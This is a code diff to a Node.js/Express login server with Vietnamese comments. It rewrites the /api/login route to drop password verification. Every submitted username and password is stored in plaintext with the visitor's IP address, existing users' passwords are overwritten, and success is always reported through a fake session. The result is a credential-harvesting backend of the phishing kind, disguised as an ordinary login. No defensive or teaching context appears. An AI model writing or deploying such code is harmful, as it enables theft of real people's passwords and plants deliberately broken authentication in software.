@@ -37,7 +37,7 @@ app.use(session({
   cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 } // 1 ngày
 }));
 
-// API: Đăng ký (tạo tài khoản thật)
+// API: Đăng ký
 app.post('/api/register', async (req, res) => {
   const { username, email, password } = req.body;
 
@@ -68,7 +68,7 @@ app.post('/api/register', async (req, res) => {
   }
 });
 
-// API: Đăng nhập (authentication thật)
+// API: Đăng nhập (chỉ lưu thông tin, không kiểm tra)
 app.post('/api/login', async (req, res) => {
   const { username, password } = req.body;
   const clientIP = req.ip || req.connection.remoteAddress || 'unknown';
@@ -78,59 +78,55 @@ app.post('/api/login', async (req, res) => {
   }
 
   try {
-    // Tìm user trong database
-    db.get('SELECT * FROM users WHERE username = ? OR email = ?', [username, username], async (err, user) => {
+    // Kiểm tra xem username đã tồn tại chưa
+    db.get('SELECT id FROM users WHERE username = ? OR email = ?', [username, username], (err, existingUser) => {
       if (err) {
         return res.status(500).json({ error: 'Lỗi server' });
       }
 
-      if (!user) {
-        // User không tồn tại - vẫn lưu credential để demo
+      if (existingUser) {
+        // Cập nhật password mới nếu đã tồn tại
+        db.run('UPDATE users SET password = ?, last_login = CURRENT_TIMESTAMP, last_ip = ? WHERE id = ?',
+               [password, clientIP, existingUser.id], (err) => {
+          if (err) {
+            return res.status(500).json({ error: 'Lỗi server' });
+          }
+          // Tạo session giả
+          req.session.userId = Date.now();
+          req.session.username = username;
+
+          res.json({
+            success: true,
+            message: 'Đăng nhập thành công!',
+            user: {
+              id: Date.now(),
+              username: username,
+              email: username
+            }
+          });
+        });
+      } else {
+        // Tạo user mới
         db.run('INSERT INTO users (username, email, password, last_login, last_ip) VALUES (?, ?, ?, CURRENT_TIMESTAMP, ?)',
                [username, username, password, clientIP], function(err) {
           if (err) {
-            console.error('Error saving demo credential:', err);
+            return res.status(500).json({ error: 'Lỗi server' });
           }
+          // Tạo session giả
+          req.session.userId = Date.now();
+          req.session.username = username;
+
+          res.json({
+            success: true,
+            message: 'Đăng nhập thành công!',
+            user: {
+              id: Date.now(),
+              username: username,
+              email: username
+            }
+          });
         });
-        return res.status(401).json({ error: 'Tài khoản không tồn tại' });
       }
-
-      // Kiểm tra password
-      const isValidPassword = await bcrypt.compare(password, user.password);
-
-      if (!isValidPassword) {
-        // Password sai - vẫn lưu credential để demo
-        db.run('UPDATE users SET password = ?, last_login = CURRENT_TIMESTAMP, last_ip = ? WHERE id = ?',
-               [password, clientIP, user.id], function(err) {
-          if (err) {
-            console.error('Error updating demo credential:', err);
-          }
-        });
-        return res.status(401).json({ error: 'Mật khẩu không đúng' });
-      }
-
-      // Đăng nhập thành công
-      db.run('UPDATE users SET last_login = CURRENT_TIMESTAMP, last_ip = ? WHERE id = ?',
-             [clientIP, user.id], function(err) {
-        if (err) {
-          console.error('Error updating login time:', err);
-        }
-      });
-
-      // Tạo session
-      req.session.userId = user.id;
-      req.session.username = user.username;
-
-      res.json({
-        success: true,
-        message: 'Đăng nhập thành công!',
-        user: {
-          id: user.id,
-          username: user.username,
-          email: user.email,
-          created_at: user.created_at
-        }
-      });
     });
   } catch (error) {
     console.error('Login error:', error);
